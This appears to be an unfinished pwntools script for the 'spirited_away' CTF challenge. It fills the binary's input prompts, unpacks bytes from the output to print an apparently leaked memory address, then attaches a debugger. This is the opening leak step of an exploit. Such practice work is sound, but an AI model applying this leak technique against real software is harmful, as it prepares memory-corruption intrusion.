from pwn import *

p = process("./spirited_away")


def add(name, age, reazon, comment):
    p.sendlineafter("Please enter your name: ", name)
    p.sendlineafter("Please enter your age: ", age)
    p.sendlineafter("Why did you came to see this movie? ", str(age))
    p.sendlineafter("Please enter your comment: ", comment)



def free():
    p.sendlineafter("Would you like to leave another comment? <y/n>: ", "y")

add("0", '0', '0', '0')
p.recvuntil("Name:")
print("begin")
name = p.recvuntil("Age: ")
print(name)
age = p.recvuntil("Reason: ")
print(age)
reason = p.recvuntil("Comment: ")
print(reason, hex(u64(reason[-16:-10].ljust(8, "\x00"))))
gdb.attach(p)
p.interactive()
#age = p.recvuntil("Reazon: ")
#Reazon = p.recvuntil("Comment: ")
#comment = p.recvuntil("\n")
#print(name, age, Reazon, comment)
#print(p.recv())
#p.recvuntil("Name: ")
#name = p.recvuntil("Age: ")
#age = p.recvuntil("Reazon: ")
#print(p64())










